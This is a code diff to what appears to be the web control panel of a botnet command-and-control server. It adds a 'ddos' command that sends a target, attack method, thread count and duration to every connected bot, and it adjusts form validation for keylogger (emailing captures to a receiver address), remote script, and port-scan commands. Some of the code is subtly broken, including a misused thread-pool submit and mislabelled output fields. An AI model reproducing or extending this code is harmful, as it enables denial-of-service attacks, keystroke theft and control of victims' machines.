@@ -586,7 +586,8 @@ def map_update():
 		sleep(5)
 #endregion
 
-#region Server Init
+#region Server Initialization
+
 def collect():
 	global hostname_list, public_ips
 	hostname_list = []
@@ -677,6 +678,13 @@ def call_script(i, cmd):
 		del all_address[i]
 		del all_connections[i]
 
+def _all_clients(i, cmd):
+	try:
+		all_connections[i].send(cmd.encode())
+		return (f'{all_connections[i].recv(1024*5).decode("ascii")}')
+	except BrokenPipeError:
+		del all_address[i]
+		del all_connections[i]
 #endregion
 
 #region Send Commands
@@ -748,14 +756,14 @@ def command_check(command):
 	elif command == "keylogger":
 		keylogger_intervals 		= request.form.get('keylogger-intervals')
 		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
-		if keylogger_intervals == None or keylogger_reciever_email == "": return("Error: Please fill in all fields")
+		if keylogger_intervals == "" or keylogger_reciever_email == "": return("Error: Please fill in all fields")
 		else: return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
 
 	elif command == "runscript":
 		script_name 	= request.form.get('runscript-name')
 		script_code 	= request.form.get('runscript-code')
 		script_type 	= request.form.get('script-type-selection')
-		if script_name == None or script_code == None or script_type == "": return("Error: Please fill in all fields")
+		if script_name == "" or script_code == "" or script_type == "": return("Error: Please fill in all fields")
 		else: return (f'{command} {script_name} {script_type} {script_code}')
 
 	elif command == "download":
@@ -782,8 +790,16 @@ def command_check(command):
 		port_scan_starting_port = request.form.get('portscan-starting-port')
 		port_scan_ending_port 	= request.form.get('portscan-ending-port')
 		port_scan_threads 		= request.form.get('portscan-threads')
-		if port_scan_starting_port == None or port_scan_ending_port == None or port_scan_threads == "": return("Error: Please fill in all fields")
+		if port_scan_starting_port == "" or port_scan_ending_port == "" or port_scan_threads == "": return("Error: Please fill in all fields")
 		else: return (f'{command} {port_scan_starting_port} {port_scan_ending_port} {port_scan_threads}')
+
+	elif command == "ddos":
+		ddos_target 	= request.form.get('ddos-website-target')
+		ddos_method 	= request.form.get('ddos-website-method')
+		ddos_time 		= request.form.get('ddos-website-time')
+		ddos_threads 	= request.form.get('ddos-website-thread')
+		if ddos_target == "" or ddos_method == "" or ddos_time == "" or ddos_threads == "": return("Error: Please fill in all fields")
+		else: return (f'{command} {ddos_method} {ddos_target} {ddos_threads} {ddos_time}')
 
 	else: return command
 #endregion
@@ -858,6 +874,34 @@ def sendcommands():
 				elif command_ == "listbots":
 					out += f"\n\nConnected bots: {str(len(database))}"
 					return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+
+				elif command_ == "ddos":
+					commandCheck = str(command_check(str(command_)))
+					if commandCheck == "Error: Please fill in all fields": return render_template('sendcommands.html', commandStatus=commandCheck, out=out)
+					else: 
+						with ThreadPoolExecutor(max_workers=500) as executor:
+							try: 	
+								xx = 0
+								for x in database:
+									print_debug(f"Sending {str(commandCheck)} to {int(x.idNum)}")
+									executor.submit(_all_clients(int(x.idNum), str(commandCheck)))
+									xx += 1
+								command__ = commandCheck.split(" ")
+								out += f"""\n\n
+        --------- Attack Started ---------
+
+        Bots:   \t{xx}
+        Target: \t{command__[1]}
+        Method: \t{command__[2]}
+        Threads:\t{command__[3]}
+        Time:   \t{command__[4]}
+
+								"""
+								return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
+							except Exception as e: 
+								print_debug("Error while sending command" + str(e))
+								return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
+
 
 				else:
 					commandCheck = str(command_check(str(command_)))
